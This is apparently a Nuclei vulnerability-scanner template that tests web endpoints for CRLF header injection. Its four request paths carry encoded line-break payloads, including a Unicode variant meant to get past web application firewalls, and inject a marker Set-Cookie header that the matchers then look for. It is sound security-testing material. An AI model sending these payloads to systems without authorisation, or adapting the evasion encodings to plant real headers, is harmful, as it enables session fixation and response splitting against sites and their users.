id: advanced-crlf-bypass

info:
  name: Advanced CRLF Injection with WAF Evasion
  author: thenawabx
  severity: medium
  description: Targeted at bypassing filters using multiple encoding techniques to inject custom HTTP headers.
  tags: crlf, advanced, waf-bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/%0d%0aSet-Cookie:crlf_injection=confirmed"
      - "{{BaseURL}}/?url=%0d%0aSet-Cookie:crlf_injection=confirmed"
      - "{{BaseURL}}/?path=%E5%98%8A%E5%98%8DSet-Cookie:crlf_injection=confirmed"
      - "{{BaseURL}}/?next=%0d%0aSet-Cookie:crlf_injection=confirmed"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      # Verifies if our custom cookie was successfully set in the response header
      - type: word
        part: header
        words:
          - "Set-Cookie: crlf_injection=confirmed"

      # Ensures successful status code
      - type: status
        status:
          - 200
          - 301
          - 302